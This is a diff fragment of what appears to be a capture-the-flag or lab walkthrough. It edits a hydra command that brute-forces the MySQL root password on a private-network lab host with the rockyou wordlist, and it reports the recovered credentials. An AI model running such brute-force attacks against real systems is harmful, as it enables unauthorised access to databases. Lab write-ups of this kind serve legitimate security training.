@@ -39,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Brute Force mysql credentials
 
 ```sh
-hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 mysql://192.168.204.118
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.204.118
 ```
 
 Credentials obtained `root:prettywoman`.
